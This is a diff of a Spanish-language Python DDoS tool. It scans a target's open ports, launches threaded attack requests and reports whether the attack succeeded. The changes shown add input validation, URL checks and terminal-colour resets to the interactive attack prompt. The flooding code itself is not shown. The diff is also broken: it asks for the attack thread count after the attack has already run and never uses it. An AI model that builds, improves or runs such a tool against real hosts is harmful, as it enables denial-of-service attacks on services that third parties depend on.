@@ -24,7 +24,7 @@ def scan_open_ports(url):
                         open_ports.append(port)
         return open_ports
     except Exception as e:
-        print(Fore.BLACK + Back.RED + f"Error al escanear puertos abiertos: {e}")
+        print(f"Error al escanear puertos abiertos: {e}")
         return []
 
 def send_attack(host, port, requestData, success_flag):
@@ -46,13 +46,17 @@ def ddos_attack(url):
     try:
         open_ports = scan_open_ports(url)
         if open_ports:
-            print(Style.RESET_ALL + "Puertos abiertos:", open_ports)
+            print("Puertos abiertos:", open_ports)
         else:
             print(Fore.BLACK + Back.RED + "No se encontraron puertos abiertos.")
 
         parsed_url = urllib.parse.urlparse(url)
         host = parsed_url.hostname
         port = parsed_url.port
+
+        if host is None:
+            print(Fore.BLACK + Back.RED + "URL inválida. Por favor, ingresa una URL válida.")
+            return
 
         if port is None:
             port = 443 if parsed_url.scheme == "https" else 80
@@ -72,8 +76,10 @@ def ddos_attack(url):
 
         if success_flag.is_set():  # Si la bandera de éxito está establecida, significa que el ataque fue denegado
             print(Fore.BLACK + Back.RED + "ATAQUE DENEGADO")
+            print(Style.RESET_ALL +"")
         else:
             print(Fore.BLACK + Back.LIGHTGREEN_EX +" ATAQUE EXITOSO ")
+            print(Style.RESET_ALL +"")
 
     except urllib.error.URLError as e:
         print(Fore.BLACK + Back.RED + "URL inválida:", url)
@@ -87,14 +93,60 @@ def ddos_attack_main():
     clear_screen()
     banner()
 
-    try:
+    while True:
         respuesta = input(Style.RESET_ALL + "¿Desea realizar un ataque DDoS? (s/n): ")
+        if respuesta.lower() in ["s", "n"]:
+            break
+        else:
+            clear_screen()  # Limpiar la pantalla antes de volver a solicitar la entrada
+            banner()
+            print(Fore.BLACK + Back.RED + "Por favor, inserta un comando válido.")
 
-        if respuesta.lower() == "s":
+    if respuesta.lower() == "s":
+        while True:
+            clear_screen()
+            banner()
             url = input(Style.RESET_ALL + "Ingresa la URL completa del host: ")
-            ddos_attack(url)
+            if not url.strip():  # Verificar si la entrada está vacía
+                clear_screen()  # Limpiar la pantalla antes de mostrar el mensaje de error
+                banner()
+                print(Fore.BLACK + Back.RED + "Inserte datos válidos.")
+                continue
+            try:
+                parsed_url = urllib.parse.urlparse(url)  # Intenta analizar la URL
+                if not parsed_url.scheme or not parsed_url.hostname:
+                    raise ValueError
+                ddos_attack(url)  # Realiza el ataque si la URL es válida
+                break  # Sale del bucle si el ataque se realizó con éxito
+            except ValueError:
+                clear_screen()  # Limpiar la pantalla antes de mostrar el mensaje de error
+                banner()
+                print(Fore.BLACK + Back.RED + "URL inválida. Por favor, ingresa una URL válida.")
+                input(Style.RESET_ALL + "Presiona Enter para continuar...")
+                continue  # Vuelve a solicitar la URL si es inválida
+
+        while True:
+            clear_screen()
+            banner()
+            num_threads_input = input(Style.RESET_ALL + "Ingrese el número de hilos para el ataque DDoS: ")
+            try:
+                num_threads = int(num_threads_input)
+                break  # Sale del bucle si el número de hilos es válido
+            except ValueError:
+                clear_screen()  # Limpiar la pantalla antes de mostrar el mensaje de error
+                banner()
+                print("Por favor, ingresa un número entero válido para el número de hilos.")
+                input(Style.RESET_ALL + "Presiona Enter para continuar...")
+                continue  # Vuelve a solicitar el número de hilos si no es válido
+
+    elif respuesta.lower() == "n":
+        print("No se realizará un ataque DDoS.")
+
+    try:
+        input("Presiona Enter para salir...")
     except KeyboardInterrupt:
         print(Fore.BLACK + Back.RED + "\nAtaque DDoS interrumpido.")
+
 
 
 def banner():
@@ -113,7 +165,4 @@ def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
 
 if __name__ == "__main__":
-
-    clear_screen()
-    banner()
     ddos_attack_main()
